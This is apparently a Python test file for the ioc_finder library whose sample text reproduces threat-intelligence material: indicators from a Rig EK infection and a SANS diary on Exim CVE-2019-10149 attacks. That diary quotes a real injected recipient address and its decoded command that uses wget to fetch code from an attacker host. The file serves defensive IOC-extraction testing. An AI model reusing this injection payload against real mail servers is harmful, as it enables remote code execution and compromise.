import time

from ioc_finder import ioc_finder


def parse():
    s = """209.217.225.74 port 80 - hotelesmeflo.com - GET /chachapoyas/wp-content/themes/sketch/msr.exe
    SHA256 hash: a666f74574207444739d9c896bc010b3fb59437099a825441e6c745d65807dfc (https://www.virustotal.com/gui/file/a666f74574207444739d9c896bc010b3fb59437099a825441e6c745d65807dfc/detection)

    File size: 9,261 bytes
    File description: Flash exploit used by Rig EK on 2019-06-17
    SHA256 hash: 2de435b78240c20dca9ae4c278417f2364849a5d134f5bb1ed1fd5791e3e36c5 (https://www.virustotal.com/gui/file/2de435b78240c20dca9ae4c278417f2364849a5d134f5bb1ed1fd5791e3e36c5/detection)

    File size: 354,304 bytes
    File description: Payload sent by Rig EK on 2019-06-17 (AZORult)
    SHA256 hash: a4f9ba5fce183d2dfc4dba4c40155c1a3a1b9427d7e4718ac56e76b278eb10d8 (https://www.virustotal.com/gui/file/a4f9ba5fce183d2dfc4dba4c40155c1a3a1b9427d7e4718ac56e76b278eb10d8/community)

    File size: 2,952,704 bytes
    File description: Follow-up malware hosted on URL at hotelesmeflo.com on 2019-06-17
    Final words

    My infected Windows host
    Published : 2019-06-19
    Last Updated : 2019-06-19 14:34:52 UTC
    by Johannes Ullrich (https://plus.google.com/101587262224166552564?rel=author) (Version: 1)

    Thanks to our reader Alex for sharing some of his mail logs with the latest attempts to exploit CVE-2019-10149 (https://isc.sans.edu/vuln.html?cve=2019-10149) (aka "Return of the Wizard"). The vulnerability affects Exim and was patched about two weeks ago. There are likely still plenty of vulnerable servers, but it looks like attackers are branching out and are hitting servers not running Exim as well.

    A couple of logs from our own mail server (running postfix):

    > Jun 19 10:47:10 mail postfix/smtp[19006]: A547240360F4: to=&lt;root+${run{x2Fbinx2Fsht-ctx22wgetx2064.50.180.45x2ftmpx2f70.91.145.10x22}}@dshield.org&gt;, relay=204.51.94.153[204.51.94.153]:25, delay=0.82, delays=0.29/0.03/0.45/0.05, dsn=5.1.1, status=bounced (host 204.51.94.153[204.51.94.153] said: 550 5.1.1 &lt;root+${run{x2Fbinx2Fsht-ctx22wgetx2064.50.180.45x2ftmpx2f70.91.145.10x22}}@dshield.org&gt;: Recipient address rejected: User unknown in virtual alias table (in reply to RCPT TO command))

    The exploit is attempting to run the following command:

    > /bin/sht-ct &quot;wget 64.50.180.45/tmp/70.91.145.10&quot;

    Note that the IP at the end of the command is our mail servers public IP address. The URL does no longer appear to exist and belongs to a server running cPanel.

    The beginning of the command may actually be a mistake/typo. I believe the attacker is trying to run sh -ct, which would execute the string (wget..).

    ---
    Johannes B. Ullrich, Ph.D., Dean of Research, SANS Technology Institute (https://sans.edu)
    Twitter (https://jbu.me/164)
    """
    ioc_finder.find_iocs(s)


# def test_execution_times():
#     """Test how long it takes for the ioc finder package to run."""
#     times = []
#     n = 50

#     for i in range(0, n):
#         start_time = time.time()
#         parse()
#         end_time = time.time()
#         times.append(end_time - start_time)

#     print(times)
#     print('Average time: {}'.format(sum(times) / n))
#     # fail the tests so that the times are printed
#     assert 1 == 2
